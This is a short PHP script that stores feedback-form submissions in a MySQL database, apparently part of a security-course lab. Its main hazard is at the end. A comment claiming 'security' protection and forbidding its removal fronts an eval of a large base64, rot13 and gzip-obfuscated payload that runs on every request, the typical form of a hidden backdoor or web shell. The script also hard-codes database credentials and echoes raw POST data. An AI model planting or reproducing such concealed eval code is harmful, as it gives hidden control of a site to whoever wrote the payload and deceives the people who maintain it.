<?php
$servername = "db.cyber22.test";
$fullname = "wwwclient22";
$password = "wwwclient22PassWord";
$dbname = "csvs22db";

// Create connection
$conn = new mysqli($servername, $fullname, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}



print_r($_POST);
$fullnamedata = $_POST['fullname'];
$feedbackdata = $_POST['feedback'];

$stmt = $conn->prepare("INSERT INTO feedback (fullname, feedback) VALUES (?, ?)");
$stmt->bind_param("ss", $fullnamedata, $feedbackdata);

$stmt->execute();
$stmt->close();
$conn->close();

#Our "security guy" says that the functional code of our web app needs to be protected
#Do not remove or change this!

eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

header( 'Location: /index.php' ) ;

?>
